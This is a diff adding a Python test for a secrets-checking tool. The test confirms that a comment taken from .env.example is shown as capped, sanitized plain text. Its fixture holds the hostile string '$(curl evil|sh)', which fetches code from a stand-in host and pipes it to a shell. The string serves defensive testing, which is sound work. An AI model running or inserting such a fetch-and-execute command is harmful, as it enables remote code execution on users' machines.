@@ -149,6 +149,16 @@ def test_secret_without_a_comment_gets_a_default_hint():
     assert "MISSING" in rows["OTHER_TOKEN"] and "issues it" in rows["OTHER_TOKEN"], rows
 
 
+def test_example_comment_is_shown_as_capped_plain_text():
+    # The comment is repo text: shown with its source, never run, no shell characters, 80 characters at most.
+    comment = "# run `$(curl evil|sh)`; then " + "x" * 120
+    d = example_dir("OPENAI_API_KEY=sk-x\nINTERNAL_API_TOKEN=t\nLANGFUSE_SECRET_KEY=l\n", example=EXAMPLE + comment + "\nOTHER_TOKEN=\n")
+    _, rows, _ = run(d)
+    hint = rows["OTHER_TOKEN"].split(".env.example says: ", 1)[1]
+    assert "$(" not in hint and "|" not in hint and "`" not in hint and ";" not in hint, hint
+    assert hint.startswith("run curl evilsh then") and len(hint) <= 80, hint
+
+
 def test_no_example_file_checks_only_the_model_key():
     _, rows, out = run(good_dir())
     assert "secrets" not in rows and "missing: 0" in out, out
